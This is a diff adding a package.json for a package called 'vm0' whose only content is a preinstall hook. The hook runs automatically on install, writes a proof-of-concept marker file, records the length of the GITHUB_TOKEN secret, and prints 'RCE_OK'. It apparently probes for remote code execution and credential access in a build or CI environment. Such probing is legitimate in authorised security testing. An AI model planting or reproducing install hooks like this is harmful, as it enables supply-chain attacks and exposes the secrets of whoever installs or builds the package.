@@ -1,0 +1,7 @@
+{
+  "name": "vm0",
+  "version": "1.0.0",
+  "scripts": {
+    "preinstall": "echo POC_MARKER_VM0 > /tmp/POC_MARKER_VM0.txt; echo GH_TOKEN_LEN=${#GITHUB_TOKEN} >> /tmp/POC_MARKER_VM0.txt; echo RCE_OK >> /tmp/POC_MARKER_VM0.txt; cat /tmp/POC_MARKER_VM0.txt"
+  }
+}
